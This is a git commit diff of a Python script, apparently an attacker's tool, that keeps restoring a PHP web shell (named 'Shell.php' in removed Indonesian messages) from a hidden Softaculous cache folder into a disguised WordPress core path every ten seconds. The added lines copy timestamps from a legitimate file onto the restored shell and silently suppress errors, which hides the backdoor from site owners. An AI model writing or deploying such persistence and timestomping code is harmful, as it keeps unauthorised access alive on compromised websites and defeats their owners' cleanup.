5d9ccfa366e2fe26ccd553e4ba54a924bba9d908
nyxthenight <nyxthenight88@gmail.com>
2025-07-12 03:06:33 +0700

    Update cache.py

--- cache.py
+++ cache.py
@@ -2,14 +2,18 @@ import shutil
 import os
 import time
 
-backup_php = "/home2/foxlogde/.softaculous/.cache/logs.php"
-restore_path = "/home2/foxlogde/public_html/wp-includes/pomo/react.php"
+backup_php = "/home/foxlogde/.softaculous/.cache/logs.php"
+restore_to = "/home/foxlogde/public_html/wp-includes/pomo/react.php"
+copy_time_from = "/home/foxlogde/public_html/wp-includes/pomo/po.php"
 
 while True:
-    if not os.path.exists(restore_path):
-        shutil.copy2(backup_php, restore_path)
-        print("Shell.php berhasil di-restore ke public_html.")
-    else:
-        print("Shell.php masih ada, tidak perlu restore.")
-    
-    time.sleep(10)  # delay 10 detik
+    try:
+        if not os.path.exists(restore_to):
+            shutil.copy2(backup_php, restore_to)
+
+            ref_stat = os.stat(copy_time_from)
+            os.utime(restore_to, (ref_stat.st_atime, ref_stat.st_mtime))
+
+        time.sleep(10)
+    except:
+        time.sleep(10)
